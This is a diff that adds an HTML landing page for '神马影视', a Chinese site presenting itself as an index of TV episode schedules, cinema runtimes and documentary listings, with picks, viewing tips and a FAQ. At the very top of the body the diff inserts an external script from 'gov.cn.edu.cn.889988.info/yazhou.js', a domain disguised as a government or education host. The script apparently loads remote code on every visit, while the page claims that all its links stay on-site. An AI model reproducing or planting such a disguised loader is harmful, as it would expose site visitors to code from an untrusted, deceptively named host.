@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>神马影视（shenmayingshi-app.github.io）· 剧集档期与院线片长索引 — 每周一·四更新</title>
+<meta name="description" content="神马影视把剧集更新节点、院线档期与片长、纪录片与动画上线信息整理成短条目清单，每周一、周四各更新一次；站点只做信息索引，不提供播放与下载，地址 https://shenmayingshi-app.github.io。">
+<meta name="keywords" content="神马影视,神马影视官网,神马影视入口,shenmayingshi-app.github.io,剧集更新日历,院线档期查询,纪录片上线索引,番剧补番顺序,经典修复版对比,观影短评">
+<meta name="author" content="神马影视编辑部">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://shenmayingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="神马影视">
+<meta property="og:title" content="神马影视 — 剧集档期、院线片长与纪录片索引清单">
+<meta property="og:description" content="每周一、周四更新的影视信息清单：更新节点、片长、制式、一句话短评。只做索引，不放片源。">
+<meta property="og:url" content="https://shenmayingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="神马影视 — 影视信息索引清单">
+<meta name="twitter:description" content="剧集更新节点、院线档期、纪录片与番剧上线信息，整理成一页能读完的清单。">
+<style>
+:root{
+  --ink:#0a0e1a;
+  --ink2:#111726;
+  --line:#232c42;
+  --word:#e9e7e0;
+  --dim:#9aa3b8;
+  --gold:#ffc247;
+  --mint:#6ee7d5;
+  --pad:clamp(18px,4vw,56px);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+body{
+  background:var(--ink);
+  color:var(--word);
+  font:16px/1.75 "PingFang SC","Hiragino Sans GB","Microsoft YaHei","Source Han Sans SC",system-ui,sans-serif;
+  letter-spacing:.01em;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 顶部公告条 */
+.ticker{
+  background:var(--gold);color:#201400;
+  font-size:13px;line-height:34px;height:34px;overflow:hidden;white-space:nowrap;
+}
+.ticker span{display:inline-block;padding-left:100%;animation:slide 26s linear infinite}
+@keyframes slide{to{transform:translateX(-100%)}}
+
+/* 头部 */
+header{
+  position:sticky;top:0;z-index:20;
+  background:rgba(10,14,26,.94);
+  backdrop-filter:saturate(140%) blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.bar{
+  max-width:1180px;margin:0 auto;padding:0 var(--pad);
+  display:flex;align-items:center;gap:22px;height:64px;
+}
+.logo{display:flex;align-items:center;gap:10px;font-size:19px;font-weight:700;letter-spacing:.06em;flex:none}
+.logo i{
+  width:22px;height:22px;background:var(--gold);
+  clip-path:polygon(0 0,100% 0,100% 62%,62% 100%,0 100%);
+}
+nav{margin-left:auto;overflow-x:auto;scrollbar-width:none;-ms-overflow-style:none}
+nav::-webkit-scrollbar{display:none}
+nav ul{display:flex;gap:26px;white-space:nowrap}
+nav a{font-size:14px;color:var(--dim);padding:6px 0;border-bottom:2px solid transparent}
+nav a:hover{color:var(--gold);border-bottom-color:var(--gold)}
+nav a:first-child{color:var(--word)}
+
+/* 首屏 */
+.hero{
+  max-width:1180px;margin:0 auto;padding:clamp(40px,7vw,88px) var(--pad) 0;
+  display:grid;grid-template-columns:1.35fr .85fr;gap:clamp(24px,4vw,48px);align-items:start;
+}
+.hero h1{
+  font-size:clamp(38px,8vw,74px);line-height:1.06;font-weight:800;letter-spacing:.02em;
+  padding-left:16px;border-left:6px solid var(--gold);
+}
+.hero h1 em{display:block;font-style:normal;font-size:.34em;letter-spacing:.24em;color:var(--mint);margin-top:14px;font-weight:600}
+.lead{color:var(--dim);margin:26px 0 0;max-width:52ch;font-size:15.5px}
+.lead b{color:var(--word);font-weight:600}
+.tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:24px}
+.tags a{
+  font-size:13px;color:var(--word);background:var(--ink2);
+  border:1px solid var(--line);padding:7px 13px;
+}
+.tags a:hover{border-color:var(--gold);color:var(--gold)}
+
+.card{
+  background:var(--ink2);border:1px solid var(--line);padding:22px 22px 8px;
+  background-image:repeating-linear-gradient(135deg,rgba(255,194,71,.05) 0 2px,transparent 2px 9px);
+}
+.card h2{font-size:13px;letter-spacing:.2em;color:var(--mint);font-weight:600;margin-bottom:14px}
+.card dl{display:grid;grid-template-columns:auto 1fr;gap:0}
+.card dt{font-size:13px;color:var(--dim);padding:9px 0;border-top:1px dashed var(--line)}
+.card dd{font-size:13.5px;padding:9px 0 9px 14px;border-top:1px dashed var(--line);word-break:break-all}
+.card dd a{color:var(--gold);border-bottom:1px solid rgba(255,194,71,.4)}
+
+/* 数据条 */
+.stats{
+  max-width:1180px;margin:clamp(34px,5vw,60px) auto 0;padding:0 var(--pad);
+  display:grid;grid-template-columns:repeat(4,1fr);
+  border-top:1px solid var(--line);border-bottom:1px solid var(--line);
+}
+.stats div{padding:20px 8px;border-left:1px solid var(--line);text-align:center}
+.stats div:first-child{border-left:0}
+.stats strong{display:block;font-size:clamp(22px,3.4vw,32px);color:var(--gold);font-weight:700;font-variant-numeric:tabular-nums}
+.stats span{font-size:12.5px;color:var(--dim);letter-spacing:.08em}
+
+/* 通用区块 */
+section{max-width:1180px;margin:0 auto;padding:clamp(48px,7vw,92px) var(--pad) 0}
+.head{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:32px}
+.head h2{font-size:clamp(22px,3.6vw,30px);font-weight:700;letter-spacing:.02em}
+.head p{font-size:13.5px;color:var(--dim);margin-left:auto;max-width:42ch}
+
+/* 分类 */
+.cats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line)}
+.cats article{background:var(--ink);padding:26px 22px 30px;transition:background .25s}
+.cats article:hover{background:var(--ink2)}
+.cats b{display:block;font-size:26px;color:var(--line);font-variant-numeric:tabular-nums;line-height:1}
+.cats h3{font-size:17px;margin:14px 0 10px;font-weight:600}
+.cats h3::after{content:"";display:block;width:28px;height:2px;background:var(--gold);margin-top:10px}
+.cats p{font-size:13.5px;color:var(--dim)}
+
+/* 片单 */
+.pick{border-top:1px solid var(--line)}
+.pick li{
+  display:grid;grid-template-columns:44px 1fr 210px;
+  gap:16px;align-items:baseline;
+  padding:20px 6px;border-bottom:1px solid var(--line);
+}
+.pick li:hover{background:var(--ink2)}
+.pick .no{font-size:13px;color:var(--gold);font-variant-numeric:tabular-nums}
+.pick h3{font-size:16.5px;font-weight:600}
+.pick h3 a{border-bottom:1px solid transparent}
+.pick h3 a:hover{border-bottom-color:var(--gold)}
+.pick .say{font-size:13.5px;color:var(--dim);margin-top:6px}
+.pick .meta{font-size:12.5px;color:var(--dim);letter-spacing:.04em;text-align:right}
+.pick .meta em{font-style:normal;color:var(--mint)}
+
+/* 流程 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-left:1px solid var(--line)}
+.steps div{position:relative;padding:6px 20px 6px 26px;border-right:1px solid var(--line);min-height:150px}
+.steps div::before{
+  content:"";position:absolute;left:-5px;top:8px;width:9px;height:9px;
+  background:var(--gold);border-radius:50%;
+}
+.steps span{font-size:12px;letter-spacing:.18em;color:var(--mint)}
+.steps h3{font-size:15.5px;margin:10px 0 8px;font-weight:600}
+.steps p{font-size:13px;color:var(--dim)}
+
+/* 问答 */
+.faq{border:1px solid var(--line);background:var(--ink2)}
+.faq details{border-bottom:1px solid var(--line)}
+.faq details:last-child{border-bottom:0}
+.faq summary{
+  cursor:pointer;list-style:none;padding:17px 22px;font-size:15.5px;font-weight:600;
+  display:flex;align-items:center;gap:12px;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"+";color:var(--gold);font-weight:700;font-size:18px;line-height:1}
+.faq details[open] summary::before{content:"−"}
+.faq details[open] summary{color:var(--gold)}
+.faq p{padding:0 22px 20px 46px;font-size:14px;color:var(--dim);max-width:70ch}
+.faq p a{color:var(--gold);border-bottom:1px solid rgba(255,194,71,.4);word-break:break-all}
+
+/* 页脚 */
+footer{margin-top:clamp(56px,8vw,96px);border-top:1px solid var(--line);background:var(--ink2)}
+.foot{max-width:1180px;margin:0 auto;padding:44px var(--pad) 0;display:grid;grid-template-columns:1.4fr 1fr 1fr 1.2fr;gap:32px}
+.foot h4{font-size:13px;letter-spacing:.16em;color:var(--mint);margin-bottom:14px;font-weight:600}
+.foot p,.foot li{font-size:13.5px;color:var(--dim);line-height:2}
+.foot li a:hover{color:var(--gold)}
+.foot .site{font-size:14px;color:var(--word)}
+.foot .site a{color:var(--gold);word-break:break-all;border-bottom:1px solid rgba(255,194,71,.4)}
+.copy{
+  max-width:1180px;margin:34px auto 0;padding:16px var(--pad) 26px;
+  border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:10px 24px;
+  font-size:12.5px;color:#6b7488;
+}
+.copy a:hover{color:var(--gold)}
+
+@media (max-width:900px){
+  .hero{grid-template-columns:1fr}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .steps{grid-template-columns:repeat(2,1fr);border-left:0;border-top:1px solid var(--line)}
+  .steps div{border-right:1px solid var(--line);border-bottom:1px solid var(--line);min-height:0;padding-bottom:18px}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media (max-width:620px){
+  .bar{height:56px;gap:14px}
+  .stats{grid-template-columns:1fr 1fr}
+  .stats div:nth-child(3){border-left:0}
+  .stats div:nth-child(-n+2){border-bottom:1px solid var(--line)}
+  .cats{grid-template-columns:1fr}
+  .pick li{grid-template-columns:34px 1fr;gap:10px}
+  .pick .meta{grid-column:2;text-align:left;padding-top:4px}
+  .steps{grid-template-columns:1fr}
+  .steps div{border-right:0}
+  .foot{grid-template-columns:1fr;gap:24px}
+  .head p{margin-left:0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="ticker"><span>神马影视 · 每周一、周四更新条目 · 片单只记录档期、片长与制式信息，站内不存放任何播放文件与下载地址 · 官网 https://shenmayingshi-app.github.io</span></div>
+
+<header>
+  <div class="bar">
+    <a class="logo" href="#"><i></i>神马影视</a>
+    <nav aria-label="站内栏目导航">
+      <ul>
+        <li><a href="#">站点速览</a></li>
+        <li><a href="#">分类导览</a></li>
+        <li><a href="#">本期片单</a></li>
+        <li><a href="#">观影步骤</a></li>
+        <li><a href="#">常见问题</a></li>
+        <li><a href="#">访问入口</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <div class="hero">
+    <div>
+      <h1>神马影视<em>剧集 · 院线 · 纪实 · 番剧 —— 信息索引清单</em></h1>
+      <p class="lead">从 2023 年起，神马影视只做一件事：把散在各处的影视信息收拢成一页能读完的清单。哪部剧更到第几集、哪部片子在哪个档期、修复版比公映版多出几分钟，这些细碎的东西才是真正影响观看体验的部分。<b>这里没有播放器，也不搬运片源</b>，只留索引、时长和一句看完之后的第一反应。</p>
+      <div class="tags">
+        <a href="#"># 剧集更新节点</a>
+        <a href="#"># 院线档期</a>
+        <a href="#"># 片长与制式</a>
+        <a href="#"># 修复版比对</a>
+        <a href="#"># 补番顺序</a>
+      </div>
+    </div>
+    <aside class="card">
+      <h2>站点名片 / SITE CARD</h2>
+      <dl>
+        <dt>官网地址</dt>
+        <dd><a href="https://shenmayingshi-app.github.io/">https://shenmayingshi-app.github.io</a></dd>
+        <dt>站点名称</dt>
+        <dd>神马影视</dd>
+        <dt>更新节奏</dt>
+        <dd>每周一 · 每周四</dd>
+        <dt>收录范围</dt>
+        <dd>剧集 / 院线 / 纪录片 / 动画 / 经典修复 / 短片</dd>
+        <dt>条目形态</dt>
+        <dd>清单 + 短评 + 索引编号</dd>
+      </dl>
+    </aside>
+  </div>
+
+  <div class="stats">
+    <div><strong>2400+</strong><span>累计整理条目</span></div>
+    <div><strong>1972–2026</strong><span>覆盖上映年份</span></div>
+    <div><strong>2 次 / 周</strong><span>固定更新频率</span></div>
+    <div><strong>5 人</strong><span>编辑部人数</span></div>
+  </div>
+
+  <section id="about">
+    <div class="head">
+      <h2>站点速览</h2>
+      <p>关于神马影视在做什么、不做什么，以及为什么只做索引。</p>
+    </div>
+    <div class="cats">
+      <article>
+        <b>关于</b>
+        <h3>为什么只有清单</h3>
+        <p>长篇影评到处都是，但多数人真正需要的是"还剩几集""值不值得开"这类一句话能答完的问题。神马影视把答案放在最前面，剩下的交给观者自己。</p>
+      </article>
+      <article>
+        <b>方法</b>
+        <h3>短评怎么写</h3>
+        <p>每条只写一句，不剧透关键转折，只描述节奏、时长和看完后的直觉判断。观点冲突时保留两种说法，不做折中。</p>
+      </article>
+      <article>
+        <b>边界</b>
+        <h3>不做什么</h3>
+        <p>不提供在线播放，不提供下载，不跳转外部资源站。神马影视只记录已经公开的上映与更新信息，页面内的链接全部指向本站栏目。</p>
+      </article>
+    </div>
+  </section>
+
+  <section id="catalog">
+    <div class="head">
+      <h2>分类导览</h2>
+      <p>六个栏目，按内容形态划分，不按地区或平台划分。</p>
+    </div>
+    <div class="cats">
+      <article>
+        <b>01</b>
+        <h3><a href="#">剧集连载</a></h3>
+        <p>跟进国产、英美、日韩剧集的更新节点，标注单集时长、总集数与完结状态，避免追到一半才发现烂尾。</p>
+      </article>
+      <article>
+        <b>02</b>
+        <h3><a href="#">院线新片</a></h3>
+        <p>记录上映档期、片长与放映制式（IMAX / 杜比 / 普通厅），并附一句看完离场时的第一反应。</p>
+      </article>
+      <article>
+        <b>03</b>
+        <h3><a href="#">纪实人文</a></h3>
+        <p>纪录片与社会题材，按主题归堆而不是按年份，适合周末一次看两到三集。</p>
+      </article>
+      <article>
+        <b>04</b>
+        <h3><a href="#">动画番剧</a></h3>
+        <p>季度新番与经典长篇，标注话数、补番顺序和剧场版与 TV 版的时间线关系。</p>
+      </article>
+      <article>
+        <b>05</b>
+        <h3><a href="#">经典修复</a></h3>
+        <p>老片的修复版与重映信息，重点关注胶片扫描版本、色彩还原差异与增删段落的对比。</p>
+      </article>
+      <article>
+        <b>06</b>
+        <h3><a href="#">短片实验</a></h3>
+        <p>30 分钟以内的短片与实验影像，附导演其他作品的线索，方便顺着往下找。</p>
+      </article>
+    </div>
+  </section>
+
+  <section id="pickup">
+    <div class="head">
+      <h2>本期片单</h2>
+      <p>编辑部五人各挑一条，凑够五条就发。信息以公开上映资料为准。</p>
+    </div>
+    <ul class="pick">
+      <li>
+        <span class="no">01</span>
+        <div>
+          <h3><a href="#">《漫长的季节》</a></h3>
+          <p class="say">时间线来回跳，但每集结尾都留得住人，适合一口气看到第四集再停。</p>
+        </div>
+        <div class="meta">剧集 · 12 集 · <em>2023</em></div>
+      </li>
+      <li>
+        <span class="no">02</span>
+        <div>
+          <h3><a href="#">《奥本海默》</a></h3>
+          <p class="say">黑白与彩色段落的切换值得单独看一遍，180 分钟最好分两次。</p>
+        </div>
+        <div class="meta">院线 · 180 分钟 · <em>2023</em></div>
+      </li>
+      <li>
+        <span class="no">03</span>
+        <div>
+          <h3><a href="#">《地球脉动 III》</a></h3>
+          <p class="say">配乐比画面更用力，看的时候记得把音量调低两格。</p>
+        </div>
+        <div class="meta">纪实 · 8 集 · <em>2023</em></div>
+      </li>
+      <li>
+        <span class="no">04</span>
+        <div>
+          <h3><a href="#">《你想活出怎样的人生》</a></h3>
+          <p class="say">前半段慢得有些考验耐心，后半段全靠画面撑住。</p>
+        </div>
+        <div class="meta">动画 · 124 分钟 · <em>2023</em></div>
+      </li>
+      <li>
+        <span class="no">05</span>
+        <div>
+          <h3><a href="#">《天堂电影院》</a></h3>
+          <p class="say">修复版比公映版多出近三十分钟，删掉的段落补回来了，值得重看。</p>
+        </div>
+        <div class="meta">修复 · 155 分钟 · <em>1988</em></div>
+      </li>
+    </ul>
+  </section>
+
+  <section id="guide">
+    <div class="head">
+      <h2>观影步骤</h2>
+      <p>开一部作品之前，按顺序确认这四件事就够了。</p>
+    </div>
+    <div class="steps">
+      <div>
+        <span>STEP 01</span>
+        <h3>先看时长和完结状态</h3>
+        <p>12 集的短剧和 80 集的长剧，决定的是完全不同的时间投入，先确认再入坑。</p>
+      </div>
+      <div>
+        <span>STEP 02</span>
+        <h3>对照更新日历</h3>
+        <p>周更剧先核对已更新集数，避免追到断层处被迫等一周。</p>
+      </div>
+      <div>
+        <span>STEP 03</span>
+        <h3>只读一句短评</h3>
+        <p>只看结论不看剧情，避开关键转折的剧透，保留第一次观看的完整感。</p>
+      </div>
+      <div>
+        <span>STEP 04</span>
+        <h3>标记已看，建自己的清单</h3>
+        <p>在站内条目上做标记，慢慢攒出一份属于自己的观影记录。</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="head">
+      <h2>常见问题</h2>
+      <p>关于神马影视被问得最多的五个问题。</p>
+    </div>
+    <div class="faq">
+      <details open>
+        <summary>神马影视提供在线播放吗？</summary>
+        <p>不提供。神马影视只做信息索引，页面里所有链接都指向站内栏目，不放任何外部播放或下载地址，也不存放媒体文件。</p>
+      </details>
+      <details>
+        <summary>网址是什么？怎么记住？</summary>
+        <p>完整地址是 <a href="https://shenmayingshi-app.github.io/">https://shenmayingshi-app.github.io</a>，直接存书签即可，首页顶部公告条和页脚都放了入口。</p>
+      </details>
+      <details>
+        <summary>多久更新一次？</summary>
+        <p>每周一和周四各一次。遇到档期密集的月份会临时加更，加更条目会在片单区单独标出。</p>
+      </details>
+      <details>
+        <summary>片单是怎么挑出来的？</summary>
+        <p>编辑部五个人各看各的，凑够五条就发。观点不一致时保留两种说法，不做折中，也不给星级评分。</p>
+      </details>
+      <details>
+        <summary>发现信息有误怎么办？</summary>
+        <p>把片名和错误之处发到站内留言入口，核实后在下一期更正，并在条目下标注更正时间。</p>
+      </details>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div>
+      <h4>关于神马影视</h4>
+      <p>一份持续维护的影视信息索引清单，记录档期、片长、制式与更新节点，只做整理，不做分发。</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <ul>
+        <li><a href="#">剧集连载</a></li>
+        <li><a href="#">院线新片</a></li>
+        <li><a href="#">纪实人文</a></li>
+        <li><a href="#">动画番剧</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>索引</h4>
+      <ul>
+        <li><a href="#">经典修复</a></li>
+        <li><a href="#">短片实验</a></li>
+        <li><a href="#">更新日历</a></li>
+        <li><a href="#">更正记录</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>访问入口</h4>
+      <p class="site">神马影视<br><a href="https://shenmayingshi-app.github.io/">https://shenmayingshi-app.github.io</a></p>
+      <p>更新日：周一 · 周四</p>
+    </div>
+  </div>
+  <div class="copy">
+    <span>© 2026 神马影视 · 影视信息索引</span>
+    <span>站点地址：<a href="https://shenmayingshi-app.github.io/">shenmayingshi-app.github.io</a></span>
+    <a href="#">返回顶部</a>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://shenmayingshi-app.github.io/#website",
+      "url":"https://shenmayingshi-app.github.io/",
+      "name":"神马影视",
+      "alternateName":"神马影视影视信息索引",
+      "inLanguage":"zh-CN",
+      "description":"剧集更新节点、院线档期与片长、纪录片与动画上线信息的索引清单，每周一、周四更新。"
+    },
+    {
+      "@type":"WebPage",
+      "@id":"https://shenmayingshi-app.github.io/#webpage",
+      "url":"https://shenmayingshi-app.github.io/",
+      "name":"神马影视 — 剧集档期与院线片长索引清单",
+      "isPartOf":{"@id":"https://shenmayingshi-app.github.io/#website"},
+      "inLanguage":"zh-CN",
+      "primaryImageOfPage":{"@id":"https://shenmayingshi-app.github.io/#organization"}
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://shenmayingshi-app.github.io/#organization",
+      "name":"神马影视",
+      "url":"https://shenmayingshi-app.github.io/",
+      "description":"影视信息索引清单，只做条目整理与短评，不提供播放与下载。"
+    },
+    {
+      "@type":"BreadcrumbList",
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"神马影视","item":"https://shenmayingshi-app.github.io/"},
+        {"@type":"ListItem","position":2,"name":"分类导览","item":"https://shenmayingshi-app.github.io/#catalog"},
+        {"@type":"ListItem","position":3,"name":"本期片单","item":"https://shenmayingshi-app.github.io/#pickup"}
+      ]
+    },
+    {
+      "@type":"FAQPage",
+      "mainEntity":[
+        {
+          "@type":"Question",
+          "name":"神马影视提供在线播放吗？",
+          "acceptedAnswer":{"@type":"Answer","text":"不提供。神马影视只做信息索引，页面里所有链接都指向站内栏目，不放任何外部播放或下载地址，也不存放媒体文件。"}
+        },
+        {
+          "@type":"Question",
+          "name":"神马影视的网址是什么？",
+          "acceptedAnswer":{"@type":"Answer","text":"完整地址是 https://shenmayingshi-app.github.io/，可直接存为书签。"}
+        },
+        {
+          "@type":"Question",
+          "name":"神马影视多久更新一次？",
+          "acceptedAnswer":{"@type":"Answer","text":"每周一和周四各更新一次，档期密集时会临时加更。"}
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+</body>
+</html>
